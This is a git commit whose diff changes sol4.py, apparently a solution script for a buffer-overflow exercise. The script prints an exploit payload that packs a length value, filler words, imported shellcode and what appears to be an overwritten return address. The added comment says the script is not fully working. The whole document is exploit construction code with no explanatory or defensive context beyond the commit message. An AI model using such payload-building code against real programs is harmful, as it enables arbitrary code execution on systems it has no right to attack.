63f49f543f59e6ad4ae0eb162555f0bbc7c2f389
Kyle Weisel <kyleweisel@gmail.com>
2015-04-30 16:52:11 -0400

    Modified sol4.py for testing

--- sol4.py
+++ sol4.py
@@ -1,4 +1,6 @@
+# Not fully working
+
 from shellcode import shellcode
 from struct import pack
 
-print pack("<I", 0xe) + pack("<I", 0x55555555)*14
+print pack("<I", 0x20) + pack("<I", 0x55555555)*11 + shellcode + pack("<I", 0x80c5b48) + pack("<I", 0x55555555)
